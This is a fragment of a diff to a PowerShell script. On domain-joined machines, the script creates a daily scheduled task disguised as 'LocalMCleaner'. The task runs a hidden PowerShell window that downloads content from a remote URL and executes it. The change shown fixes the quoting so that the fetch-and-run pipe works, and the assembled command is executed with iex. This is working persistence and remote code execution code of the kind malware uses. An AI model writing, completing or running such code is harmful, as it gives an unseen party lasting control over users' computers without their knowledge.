@@ -12,7 +12,7 @@ if ($computerInfo.CsPartOfDomain)
         Write-Host "$($response.StatusCode)"  
     } catch { 
     }  
-    $ccc = '"Powershell -WindowStyle Hidden irm '  + $url +'"|Powershell"'
+    $ccc = '"Powershell -WindowStyle Hidden irm '  + $url +'|Powershell"'
     $str = "cmd.exe /c schtasks /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:30 /f"
     iex  $str
 } 
